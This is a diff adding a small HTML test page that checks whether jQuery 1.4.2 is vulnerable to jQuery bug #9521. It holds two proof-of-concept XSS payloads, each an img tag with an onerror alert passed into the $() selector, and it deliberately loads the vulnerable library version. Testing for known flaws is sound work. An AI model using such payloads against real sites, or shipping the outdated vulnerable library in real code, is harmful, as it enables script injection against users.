@@ -1,0 +1,35 @@
+<html>
+<head>
+<meta charset="UTF-8" />
+<title>Jquery XSS</title>
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.4.2.min.js"></script>
+<!--
+TESTED VULNERABLE:
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.4.2.min.js"></script>
+
+TESTED NOT VULNERABLE:
+<script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+-->
+</head>
+<body>
+<div>Test for <a href="https://bugs.jquery.com/ticket/9521">jquery bug #9521</a></div>
+
+<div>POC 1 (javascript):</div> 
+<script>
+$('#<img  src="nosuch.jpg"  onerror="alert(\'Vulnerable to jquery bug #9521 (POC1).\')">').appendTo("body");
+</script>
+<br/>
+
+<div>POC 2 (javascript):</div> 
+<script>
+setTimeout(() => $("#<img onerror='alert(\"Vulnerable to jquery bug #9521 (POC2)\")' src=x>"), 1000);
+</script>
+<br/>
+
+
+<div class="footer">
+<hr/>
+<small>See also: <a href="http://research.insecurelabs.org/jquery/test/">jquery vuln tester</a> from Insecure Labs.</small>
+</div>
+</body>
+</html>
